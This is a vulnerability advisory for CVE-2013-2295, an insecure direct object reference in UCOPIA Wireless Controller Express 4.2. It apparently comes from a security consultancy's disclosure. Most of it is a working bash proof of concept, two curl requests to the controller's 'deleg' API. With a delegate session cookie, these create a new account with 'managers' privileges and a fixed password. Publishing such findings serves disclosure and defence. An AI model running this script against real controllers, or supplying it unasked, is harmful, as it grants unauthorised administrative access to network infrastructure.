Author: Sébastien Barré

SI Consultant  - Oppida
CVE-2013-2295


Date: 29/11/2012


Object: 
Vulnerability on UCOPIA Wireless controller express v4.2


Details:

An unrefereced security flaw is present in "UCOPIA Controller Express 100" version 4.2. build 11033115.
The vulnerability is a "Direct Objet References". Application doesn't have sufficient control over users actions.


Exploitabiliy:

Anyone who get an account on "deleg" application can access and exploit the vulnerability.
Auditor assume that this security flaw could be present in "admin" application too. Although environment constraint hasn't permit to test for.


Proof of concept:

The script "curl-deleg.sh" allow account creation with "managers" rights even if the administrator or people who runs the script can only create "low privileged" users.
Use script like this:
./curl-deleg.sh @IP-ucopia id-cookie-deleg

And account appears:
User: poc-oppida
Pwd: anXw6Ww8

#!/bin/bash

#Paramètres du script: IP/Hostname Cookie-deleg-id
#Usage: ./deleg.sh 192.168.0.1 1111111111111111111111

curl -d "request=%7B%22action%22%3A%22check_users%22%2C%22params%22%3A%7B%22users%22%3A%5B%7B%22customfields%22%3A%7B%22count%22%3Anull%2C%22defaultlang%22%3Anull%7D%2C%22login%22%3A%22poc-oppida%22%2C%22password%22%3A%22anXw6Ww8%22%2C%22lastname%22%3A%22barre%22%2C%22firstname%22%3A%22sebastien%22%2C%22phone_number%22%3A%22%22%2C%22email%22%3A%22%22%2C%22mac_address%22%3A%22%22%7D%5D%2C%22mode%22%3A%22standard%22%7D%2C%22auth%22%3A%7B%7D%7D" \
-H "Host:"$1 -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:16.0) Gecko/20100101 Firefox/16.0" -H "Accept: application/json, text/javascript, */*; q=0.01" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "X-Requested-With: XMLHttpRequest" -H "Cookie: deleg="$2 \
-k https://$1/deleg/api_ajax.php

curl -d "request=%7B%22action%22%3A%22save_users%22%2C%22params%22%3A%7B%22users%22%3A%5B%7B%22customfields%22%3A%7B%22count%22%3Anull%2C%22defaultlang%22%3Anull%7D%2C%22login%22%3A%22poc-oppida%22%2C%22password%22%3A%22anXw6Ww8%22%2C%22lastname%22%3A%22barre%22%2C%22firstname%22%3A%22sebastien%22%2C%22phone_number%22%3A%22%22%2C%22email%22%3A%22%22%2C%22mac_address%22%3A%22%22%2C%22profile%22%3A%22managers%22%2C%22multidevice%22%3A1%2C%22validity%22%3A%7B%22validity_type%22%3A%22firstconnection%22%2C%22validity_duration%22%3A%22fulldays%22%2C%22intdays%22%3A%220%22%2C%22allowtime_h%22%3A%22%22%2C%22allowtime_mn%22%3A%22%22%2C%22reneweach%22%3A%22%22%2C%22schedule%22%3A%22L00-24*M00-24*R00-24*J00-24*V00-24*S00-24*D00-24%22%7D%7D%5D%2C%22mode%22%3A%22standard%22%7D%2C%22auth%22%3A%7B%7D%7D" \
-H "Host:"$1 -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:16.0) Gecko/20100101 Firefox/16.0" -H "Accept: application/json, text/javascript, */*; q=0.01" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "X-Requested-With: XMLHttpRequest" -H "Cookie: deleg="$2 \
-k https://$1/deleg/api_ajax.php

